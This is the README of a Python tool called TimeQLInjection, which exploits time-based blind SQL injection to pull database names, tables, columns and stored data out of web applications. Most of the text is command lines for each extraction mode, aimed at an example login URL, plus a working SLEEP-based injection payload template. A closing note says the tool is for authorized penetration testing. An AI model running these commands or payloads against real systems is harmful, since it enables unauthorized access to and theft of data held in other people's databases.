# TimeQLInjection

**TimeQLInjection** is a Python-based tool for exploiting time-based blind SQL injection vulnerabilities. It automates the process of extracting sensitive information like database names, tables, columns, and data from vulnerable web applications.

## Features

- Supports both **GET** and **POST** HTTP methods.
- Dynamically determines the length of the target data.
- Extracts:
  - Database names
  - Table names
  - Column names
  - Data from specific tables and columns
- Configurable payloads for flexibility.
- Works with time delays to infer information.

## Requirements

- Python 3.7+
- `requests` library

Install the required library:
```bash
pip install requests
```

## Usage
Run the script with the following parameters:
```
python timeqli.py --url <URL> --method <HTTP_METHOD> --payload <PAYLOAD_FILE> --delay <DELAY_IN_SECONDS> --mode <MODE> [--table <TABLE>] [--column <COLUMN>]
```

### Extract Database Name
```
python timeqli.py --url "http://example.com/login" --method POST --payload payload.txt --delay 5 --mode database
```

### Extract Table Names
```
python timeqli.py --url "http://example.com/login" --method POST --payload payload.txt --delay 5 --mode tables
```

### Extract Column Names
```
python timeqli.py --url "http://example.com/login" --method POST --payload payload.txt --delay 5 --mode columns --table users
```

### Extract Data
```
python timeqli.py --url "http://example.com/login" --method POST --payload payload.txt --delay 5 --mode data --table users --column username
Payload File Example (payload.txt)
admin' AND (SELECT IF(SUBSTRING(DATABASE(),<position>,1)='<character>', SLEEP(5), 0)) AND '1'='1
Replace <position> and <character> dynamically in the script.
```

#### Notes
- Use this tool responsibly and only with proper authorization.
- This tool is intended for educational and ethical penetration testing purposes.

